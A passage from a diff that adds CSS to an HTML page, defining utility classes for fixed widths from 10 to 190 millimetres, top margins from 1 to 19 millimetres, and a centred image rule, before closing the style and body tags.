+  column-gap: 40px;
+  font-size: 0.8em; }
+
+.width-1cm {
+  width: 10mm !important; }
+
+.width-2cm {
+  width: 20mm !important; }
+
+.width-3cm {
+  width: 30mm !important; }
+
+.width-4cm {
+  width: 40mm !important; }
+
+.width-5cm {
+  width: 50mm !important; }
+
+.width-6cm {
+  width: 60mm !important; }
+
+.width-7cm {
+  width: 70mm !important; }
+
+.width-8cm {
+  width: 80mm !important; }
+
+.width-9cm {
+  width: 90mm !important; }
+
+.width-10cm {
+  width: 100mm !important; }
+
+.width-11cm {
+  width: 110mm !important; }
+
+.width-12cm {
+  width: 120mm !important; }
+
+.width-13cm {
+  width: 130mm !important; }
+
+.width-14cm {
+  width: 140mm !important; }
+
+.width-15cm {
+  width: 150mm !important; }
+
+.width-16cm {
+  width: 160mm !important; }
+
+.width-17cm {
+  width: 170mm !important; }
+
+.width-18cm {
+  width: 180mm !important; }
+
+.width-19cm {
+  width: 190mm !important; }
+
+.top-1mm {
+  margin-top: 1mm; }
+
+.top-2mm {
+  margin-top: 2mm; }
+
+.top-3mm {
+  margin-top: 3mm; }
+
+.top-4mm {
+  margin-top: 4mm; }
+
+.top-5mm {
+  margin-top: 5mm; }
+
+.top-6mm {
+  margin-top: 6mm; }
+
+.top-7mm {
+  margin-top: 7mm; }
+
+.top-8mm {
+  margin-top: 8mm; }
+
+.top-9mm {
+  margin-top: 9mm; }
+
+.top-10mm {
+  margin-top: 10mm; }
+
+.top-11mm {
+  margin-top: 11mm; }
+
+.top-12mm {
+  margin-top: 12mm; }
+
+.top-13mm {
+  margin-top: 13mm; }
+
+.top-14mm {
+  margin-top: 14mm; }
+
+.top-15mm {
+  margin-top: 15mm; }
+
+.top-16mm {
+  margin-top: 16mm; }
+
+.top-17mm {
+  margin-top: 17mm; }
+
+.top-18mm {
+  margin-top: 18mm; }
+
+.top-19mm {
+  margin-top: 19mm; }
+
+img {
+  display: block;
+  margin-left: auto;
+  margin-right: auto; }
+</style> 
+    </body></html>
